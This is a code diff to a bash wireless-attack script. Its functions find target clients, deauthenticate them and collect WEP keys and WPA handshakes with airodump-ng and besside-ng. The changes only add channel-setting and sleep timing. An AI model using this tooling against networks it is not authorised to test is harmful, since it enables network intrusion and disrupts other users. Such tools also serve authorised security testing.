@@ -679,7 +679,16 @@ fautobot()																#Automagically find new target clients
 	fi
 	killall airodump-ng
 	rm -rf $HOME/tmp*
-	sleep 0.4
+	sleep 0.5
+	if [ $NIC2 -z ] 2> /dev/null
+	then
+		iw $MON1 set channel $CHAN
+	else
+		iw $MON1 set channel $CHAN
+		sleep 0.5
+		iw $MON2 set channel $CHAN
+	fi
+	sleep 0.5
 	if [ $EVIL -z ] 2> /dev/null
 	then
 		if [ $NIC2 -z ] 2> /dev/null
@@ -862,6 +871,9 @@ fautocap()																#Deauth targets and collect handshakes
 			echo
 			if [ $WEP = 1 ] 2> /dev/null
 			then
+				sleep 0.5
+				iw $MON1 set channel $CHAN
+				sleep 0.5
 				besside-ng -b $BSSID -c $CHAN $MON1
 				WEPKEY=$(cat besside.log | grep "$ESSID" | cut -d '|' -f 2)
 				if [ $WEPKEY -z ] 2> /dev/null
@@ -891,6 +903,7 @@ fautocap()																#Deauth targets and collect handshakes
 		else
 			sleep 0.5
 			iw $MON1 set channel $CHAN
+			sleep 0.5
 			besside-ng -W -b $BSSID -c $CHAN $MON1
 			mv wpa.cap $HOME/tmp-01.cap
 			fanalyze
